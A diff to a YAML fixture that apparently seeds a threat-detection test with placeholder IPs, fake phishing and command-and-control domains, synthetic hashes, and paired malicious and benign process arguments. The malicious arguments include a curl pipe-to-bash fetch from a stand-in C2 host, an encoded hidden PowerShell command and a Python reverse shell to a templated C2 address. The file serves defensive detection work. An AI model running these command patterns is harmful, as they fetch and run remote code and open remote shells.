@@ -5,16 +5,19 @@ externalIps:
     - "198.51.100.45"
     - "198.51.100.89"
     - "198.51.100.112"
+    - "198.51.100.165"
   poolB:
     - "203.0.113.15"
     - "203.0.113.78"
     - "203.0.113.92"
     - "203.0.113.144"
+    - "203.0.113.208"
   poolC:
     - "192.0.2.33"
     - "192.0.2.67"
     - "192.0.2.140"
     - "192.0.2.205"
+    - "192.0.2.241"
 
 phishingDomains:
   - "portal.invoice-secure.example"
@@ -22,22 +25,31 @@ phishingDomains:
   - "login-reset.corporate-portal.example"
   - "secure-update.identity-sso.test"
   - "verify.sharepoint-docs.example"
+  - "remittance.vendor-billing.test"
+  - "account-session.auth-service.example"
+  - "compliance-notice.security-portal.test"
 
 c2Domains:
   - "cdn-static.telemetry-api.example"
   - "update-service.cloud-sync.test"
   - "analytics-beacon.fast-edge.example"
   - "status-check.host-monitor.test"
+  - "gateway-sync.edge-delivery.example"
+  - "tunnel.dns-relay.test"
+  - "data-exfil.object-storage.example"
 
 fileHashes:
-  # Synthetic 64-char sha256 strings (generated from test tokens)
+  # Synthetic 64-char sha256 strings (generated from inert test tokens)
   maliciousPayloader:
     - "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
     - "c0535e4be2b79ffd93291305436bf889314e4a3faec05ecffcbb7ff3109190e6"
     - "a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e"
+    - "8f434346648f6b96df89dda901c5176b10e6d0ceec3e4a35e9be7ff240c0f6f0"
+    - "b10a8db164e0754105b7a99be72e3fe5770068a8670b8a4f4ef1d66827c1817c"
   benignAdminTools:
     - "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a"
     - "ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d"
+    - "7d793037a0760186574b0282f2f435e7090a6ff4d84f88e0b686d63428d0e513"
 
 suspiciousProcesses:
   - name: "certutil.exe"
@@ -48,7 +60,15 @@ suspiciousProcesses:
     path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
     maliciousArgs: "-NoP -NonI -W Hidden -Exec Bypass -Enc VABlAHMAdABQAGEAeQBsAG8AYQBkAA=="
     benignArgs: "-ExecutionPolicy Bypass -File C:\\ITAdmin\\Scripts\\Collect-DiagnosticLogs.ps1"
+  - name: "wscript.exe"
+    path: "C:\\Windows\\System32\\wscript.exe"
+    maliciousArgs: "C:\\Users\\Public\\staging.vbs"
+    benignArgs: "C:\\Windows\\System32\\slmgr.vbs /dli"
   - name: "curl"
     path: "/usr/bin/curl"
     maliciousArgs: "-fsSL https://{c2Domain}/shell.sh | bash"
     benignArgs: "-fsSL https://apt.corp.internal/repo-key.gpg | gpg --dearmor"
+  - name: "python3"
+    path: "/usr/bin/python3"
+    maliciousArgs: "-c \"import socket,subprocess,os;s=socket.socket();s.connect(('{c2Ip}',4444));os.dup2(s.fileno(),0);subprocess.call(['/bin/sh'])\""
+    benignArgs: "/opt/monitoring/collect_metrics.py --interval 60"
